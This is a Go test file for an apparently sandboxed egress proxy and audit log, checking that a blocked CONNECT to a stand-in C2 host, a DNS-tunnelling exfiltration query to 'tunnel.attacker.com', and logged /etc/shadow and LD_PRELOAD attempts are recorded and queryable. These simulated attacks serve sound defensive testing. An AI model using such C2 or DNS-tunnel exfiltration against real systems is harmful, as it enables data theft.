package tests

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/bonjoski/airlock/pkg/audit"
	"github.com/bonjoski/airlock/pkg/proxy"
)

// TestSEC29_AuditQueryCapturesThreats tests the SEC-29 security invariant:
// Audit query and telemetry engine accurately captures, indexes, filters, and reports
// blocked network egress, DNS tunneling exfiltration attempts, and security policy violations.
func TestSEC29_AuditQueryCapturesThreats(t *testing.T) {
	tempDir := t.TempDir()
	logPath := filepath.Join(tempDir, "audit.log")

	f, err := os.Create(logPath)
	if err != nil {
		t.Fatalf("SEC-29 FAILED: Failed to create test log file: %v", err)
	}

	logger := audit.NewFileLogger(f)

	// Step 1: Run proxy with integrated DNS server and structured audit logging
	egressProxy, err := proxy.NewWithLogger([]string{"registry.npmjs.org", "github.com"}, logger)
	if err != nil {
		t.Fatalf("SEC-29 FAILED: Failed to create Egress Proxy: %v", err)
	}

	// Step 2: Adversarial Network Egress Attempt (Blocked CONNECT)
	proxyAddr := fmt.Sprintf("127.0.0.1:%d", egressProxy.Port())
	conn, err := net.Dial("tcp", proxyAddr)
	if err != nil {
		t.Fatalf("SEC-29 FAILED: Failed to connect to egress proxy: %v", err)
	}

	req := "CONNECT evil-c2-server.attacker.com:443 HTTP/1.1\r\nHost: evil-c2-server.attacker.com:443\r\n\r\n"
	_, _ = conn.Write([]byte(req))
	respReader := bufio.NewReader(conn)
	respLine, _ := respReader.ReadString('\n')
	_ = conn.Close()

	if !strings.Contains(respLine, "403 Forbidden") {
		t.Errorf("SEC-29 FAILED: Expected proxy to block connection with 403 Forbidden, got: %s", respLine)
	}

	// Step 3: Adversarial DNS Tunneling Attempt (Blocked DNS query)
	dnsAddr := fmt.Sprintf("127.0.0.1:%d", egressProxy.DNSPort())
	dnsConn, err := net.Dial("udp", dnsAddr)
	if err != nil {
		t.Fatalf("SEC-29 FAILED: Failed to dial DNS port: %v", err)
	}

	rawQuery := []byte{
		0x12, 0x34, // ID (2 bytes)
		0x01, 0x00, // Flags: Standard query (2 bytes)
		0x00, 0x01, // QDCount: 1 (2 bytes)
		0x00, 0x00, // ANCount: 0 (2 bytes)
		0x00, 0x00, // NSCount: 0 (2 bytes)
		0x00, 0x00, // ARCount: 0 (2 bytes)
		0x11, 'd', 'a', 't', 'a', '-', 'e', 'x', 'f', 'i', 'l', '-', 'c', 'h', 'u', 'n', 'k', '1',
		0x06, 't', 'u', 'n', 'n', 'e', 'l',
		0x08, 'a', 't', 't', 'a', 'c', 'k', 'e', 'r',
		0x03, 'c', 'o', 'm',
		0x00,       // Root null terminator
		0x00, 0x01, // Type: A
		0x00, 0x01, // Class: IN
	}
	_, _ = dnsConn.Write(rawQuery)
	_ = dnsConn.SetReadDeadline(time.Now().Add(1 * time.Second))
	respBuf := make([]byte, 512)
	n, readErr := dnsConn.Read(respBuf)
	_ = dnsConn.Close()

	if readErr != nil || n == 0 {
		t.Fatalf("SEC-29 FAILED: Failed to receive DNS response from interceptor: %v", readErr)
	}
	t.Logf("DNS response received: %d bytes, hex=%x", n, respBuf[:n])

	// Step 4: Record Direct Security Policy Violations and Sandboxed Executions
	_ = logger.LogSecurity(audit.SecurityRecord{
		Category: "file_access",
		Details:  "blocked attempt to access /etc/shadow outside sandbox boundary",
	})
	_ = logger.LogSecurity(audit.SecurityRecord{
		Category: "env_injection",
		Details:  "blocked injection attempt with LD_PRELOAD",
	})
	_ = logger.LogExecution(audit.ExecutionRecord{
		Command:       "npm",
		Args:          []string{"install", "malicious-pkg"},
		WorkspaceRoot: "/workspace/project",
		ExitCode:      1,
		Error:         "execution blocked by policy",
		DurationMs:    45,
	})

	// Gracefully close proxy and logger to flush all buffers and wait for goroutines
	_ = egressProxy.Close()
	_ = logger.Close()

	// Step 5: Query and Assert Invariants via QueryEngine
	engine := audit.NewQueryEngine(logPath)

	allEntries, err := engine.ReadAll()
	if err != nil {
		t.Fatalf("SEC-29 FAILED: ReadAll failed: %v", err)
	}
	if len(allEntries) == 0 {
		t.Fatalf("SEC-29 FAILED: No audit records were captured!")
	}

	for i, e := range allEntries {
		t.Logf("Entry[%d]: type=%s status=%s domain=%s host=%s details=%s", i, e.Type, e.Status(), e.Domain, e.Host, e.Details)
	}

	// Invariant A: Query Denied Egress
	blockedEgress, err := engine.Query(audit.Filter{
		RecordType: "network",
		Status:     "deny",
	})
	if err != nil {
		t.Fatalf("SEC-29 FAILED: Query for denied egress failed: %v", err)
	}
	if len(blockedEgress) == 0 {
		t.Fatalf("SEC-29 FAILED: Blocked egress was not recorded or queryable!")
	}
	if !strings.Contains(blockedEgress[0].Host, "evil-c2-server.attacker.com") {
		t.Errorf("SEC-29 FAILED: Expected blocked host evil-c2-server.attacker.com, got: %s", blockedEgress[0].Host)
	}

	// Invariant B: Query Blocked DNS Tunneling Exfiltration
	blockedDNS, err := engine.Query(audit.Filter{
		RecordType: "dns",
		Status:     "deny",
	})
	if err != nil {
		t.Fatalf("SEC-29 FAILED: Query for denied DNS failed: %v", err)
	}
	if len(blockedDNS) == 0 {
		t.Fatalf("SEC-29 FAILED: Blocked DNS query was not captured!")
	}
	if !strings.Contains(blockedDNS[0].Domain, "tunnel.attacker.com") {
		t.Errorf("SEC-29 FAILED: Expected blocked DNS domain containing tunnel.attacker.com, got: %s", blockedDNS[0].Domain)
	}

	// Invariant C: Query Security Policy Violations
	secViolations, err := engine.Query(audit.Filter{
		RecordType: "security",
	})
	if err != nil {
		t.Fatalf("SEC-29 FAILED: Query for security violations failed: %v", err)
	}
	if len(secViolations) < 2 {
		t.Fatalf("SEC-29 FAILED: Expected at least 2 security violations, got %d", len(secViolations))
	}

	// Invariant D: Search Query Filter
	shadowSearch, err := engine.Query(audit.Filter{
		Search: "shadow",
	})
	if err != nil {
		t.Fatalf("SEC-29 FAILED: Search for 'shadow' failed: %v", err)
	}
	if len(shadowSearch) != 1 || !strings.Contains(shadowSearch[0].Details, "/etc/shadow") {
		t.Errorf("SEC-29 FAILED: Search substring matching failed: %+v", shadowSearch)
	}

	// Invariant E: Aggregate Telemetry Stats
	stats, err := engine.Stats(audit.Filter{})
	if err != nil {
		t.Fatalf("SEC-29 FAILED: Stats calculation failed: %v", err)
	}
	if stats.DeniedEgressAttempts < 1 {
		t.Errorf("SEC-29 FAILED: Expected at least 1 DeniedEgressAttempt, got %d", stats.DeniedEgressAttempts)
	}
	if stats.BlockedDNSTunneling < 1 {
		t.Errorf("SEC-29 FAILED: Expected at least 1 BlockedDNSTunneling, got %d", stats.BlockedDNSTunneling)
	}
	if stats.SecurityEvents < 2 {
		t.Errorf("SEC-29 FAILED: Expected at least 2 SecurityEvents, got %d", stats.SecurityEvents)
	}
	if stats.TotalExecutions < 1 {
		t.Errorf("SEC-29 FAILED: Expected at least 1 TotalExecution, got %d", stats.TotalExecutions)
	}

	// Invariant F: Export Integrity (JSON & CSV)
	var jsonBuf bytes.Buffer
	if err := engine.Export(allEntries, audit.ExportJSON, &jsonBuf); err != nil {
		t.Fatalf("SEC-29 FAILED: Export JSON failed: %v", err)
	}
	var reParsed []audit.Entry
	if err := json.Unmarshal(jsonBuf.Bytes(), &reParsed); err != nil {
		t.Fatalf("SEC-29 FAILED: Unmarshal exported JSON failed: %v", err)
	}
	if len(reParsed) != len(allEntries) {
		t.Errorf("SEC-29 FAILED: JSON export count mismatch: %d vs %d", len(reParsed), len(allEntries))
	}

	var csvBuf bytes.Buffer
	if err := engine.Export(allEntries, audit.ExportCSV, &csvBuf); err != nil {
		t.Fatalf("SEC-29 FAILED: Export CSV failed: %v", err)
	}
	if !strings.Contains(csvBuf.String(), "evil-c2-server.attacker.com") {
		t.Errorf("SEC-29 FAILED: CSV export missing adversarial host record")
	}
	if !strings.Contains(csvBuf.String(), "LD_PRELOAD") {
		t.Errorf("SEC-29 FAILED: CSV export missing security violation record")
	}
}
